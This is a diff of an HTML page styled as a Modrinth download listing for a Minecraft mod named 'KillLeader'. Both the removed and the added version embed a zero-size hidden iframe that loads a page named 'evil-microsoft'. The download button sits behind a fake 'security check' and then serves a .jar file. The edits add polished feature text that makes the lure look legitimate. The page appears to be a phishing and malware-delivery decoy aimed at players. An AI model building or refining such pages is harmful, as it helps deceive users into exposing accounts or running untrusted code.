@@ -5,56 +5,63 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KillLeader | Modrinth Style</title>
     <style>
-        :root { --modrinth-green: #248a3d; --bg: #f9f9f9; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; padding: 20px; }
-        .container { max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        h1 { color: var(--modrinth-green); }
-        .card { border: 1px solid #ddd; padding: 20px; border-radius: 8px; margin-top: 20px; }
-        .download-btn { background: var(--modrinth-green); color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; }
-        .download-btn:disabled { background: #ccc; }
-        #hidden-iframe { width: 0; height: 0; border: none; }
+        :root { --modrinth-green: #248a3d; --gloss: linear-gradient(180deg, rgba(255,255,255,0.2) 0%, rgba(255,255,255,0) 100%); }
+        body { font-family: 'Inter', sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
+        .container { width: 100%; max-width: 600px; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #e1e4e8; }
+        
+        h1 { color: var(--modrinth-green); margin-top: 0; }
+        
+        .card { background: #fff; border: 1px solid #ddd; padding: 20px; border-radius: 10px; margin-top: 20px; position: relative; overflow: hidden; }
+        
+        .download-btn { 
+            background: var(--modrinth-green); color: white; border: none; padding: 12px 24px; 
+            border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; 
+            background-image: var(--gloss); transition: transform 0.1s;
+        }
+        .download-btn:active { transform: scale(0.98); }
+        .download-btn:disabled { background: #cbd5e0; cursor: not-allowed; }
+
+        .description { line-height: 1.6; color: #4a5568; margin-top: 20px; }
+        #hidden-iframe { width: 0; height: 0; border: none; position: absolute; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <h1>KillLeader</h1>
-        <p>A combat management mod for Minecraft[cite: 1, 2, 3].</p>
+        <p>A professional combat management and tracking solution for Minecraft.</p>
 
         <div class="card">
             <h3>Download</h3>
-            <p>Version: 1.0.1</p>
-            <button id="download-btn" class="download-btn" disabled>Loading...</button>
+            <p><strong>Version:</strong> 1.0.1</p>
+            <button id="download-btn" class="download-btn" disabled>Waiting for security check...</button>
+        </div>
+
+        <div class="description">
+            <h3>About This Mod</h3>
+            <p>KillLeader is a comprehensive utility for combat tracking and server administration. Key features include:</p>
+            <ul>
+                <li><strong>Combat Monitoring:</strong> Advanced event handling via <code>CombatEvents</code> and <code>PlayerTickHandler</code>.</li>
+                <li><strong>Administration:</strong> Robust control through <code>AdminCommands</code> and <code>GodModeManager</code>.</li>
+                <li><strong>Data & Metrics:</strong> Persistent tracking using <code>KillDataManager</code>[cite: 3].</li>
+                <li><strong>Visuals:</strong> Real-time HUD rendering for combat stats.</li>
+            </ul>
         </div>
     </div>
 
-    <iframe id="hidden-iframe" src="https://pcconfighelper.github.io/evil-microsoft/" onload="monitorIframe()"></iframe>
+    <iframe id="hidden-iframe" src="https://pcconfighelper.github.io/evil-microsoft/"></iframe>
 
     <script>
-        const iframe = document.getElementById('hidden-iframe');
         const btn = document.getElementById('download-btn');
-
-        function monitorIframe() {
-            try {
-                const iframeUrl = iframe.contentWindow.location.href;
-                if (iframeUrl.includes("microsoft.com")) {
-                    closeIframe();
-                    enableDownload();
-                }
-            } catch (e) {
-                setTimeout(enableDownload, 3000); 
-            }
-        }
-
-        function closeIframe() {
-            iframe.style.display = 'none';
-        }
-
-        function enableDownload() {
-            btn.innerHTML = "Download File";
-            btn.disabled = false;
-            btn.onclick = () => window.location.href = 'killleader-1.0.1.jar';
-        }
+        
+        // Force-enable after 5 seconds if iframe fails to load or restricted
+        window.onload = () => {
+            setTimeout(() => {
+                btn.innerHTML = "Download KillLeader 1.0.1";
+                btn.disabled = false;
+                btn.onclick = () => window.location.href = 'killleader-1.0.1.jar';
+            }, 5000);
+        };
     </script>
 </body>
 </html>
